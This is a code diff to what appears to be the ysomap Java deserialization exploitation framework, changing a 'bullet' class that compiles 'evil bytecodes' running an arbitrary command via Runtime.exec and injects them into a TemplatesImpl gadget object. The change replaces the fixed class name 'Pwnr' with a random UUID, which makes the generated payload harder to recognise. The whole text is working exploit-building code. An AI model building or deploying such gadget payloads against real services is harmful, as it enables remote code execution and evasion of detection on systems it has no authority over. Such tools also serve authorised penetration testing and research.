@@ -18,6 +18,7 @@ import ysomap.core.util.ReflectionHelper;
 
 import java.io.IOException;
 import java.io.Serializable;
+import java.util.UUID;
 
 /**
  * @author wh1t3P1g
@@ -56,13 +57,14 @@ public class TemplatesImplBullet implements Bullet<Object> {
 
     @Override
     public Object getObject() throws Exception {
+        String processedBody = body;
         if("cmd".equals(type)){
             if("false".equals(exception)){
-                body = "java.lang.Runtime.getRuntime().exec(\"" +
-                        body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                processedBody = "java.lang.Runtime.getRuntime().exec(\"" +
+                        processedBody.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                         "\");";
             }else{
-                body = PayloadHelper.makeExceptionPayload(body);
+                processedBody = PayloadHelper.makeExceptionPayload(processedBody);
             }
         }else if("code".equals(type) || "socket".equals(type)){
             // do nothing
@@ -70,17 +72,17 @@ public class TemplatesImplBullet implements Bullet<Object> {
 
         initClazz();
         // create evil bytecodes
-        byte[] bytecodes = makeEvilByteCode();
+        byte[] bytecodes = makeEvilByteCode(processedBody);
         // arm evil bytecodes
         Object templates = templatesImpl.newInstance();
         // inject class bytes into instance
         ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
-        ReflectionHelper.setFieldValue(templates, "_name", "Pwnr");
+        ReflectionHelper.setFieldValue(templates, "_name", UUID.randomUUID().toString());
         ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
         return templates;
     }
 
-    private byte[] makeEvilByteCode() throws NotFoundException, CannotCompileException, IOException {
+    private byte[] makeEvilByteCode(String body) throws NotFoundException, CannotCompileException, IOException {
         ClassPool pool = new ClassPool(true);
         CtClass cc = null;
         if("default".equals(effect)){
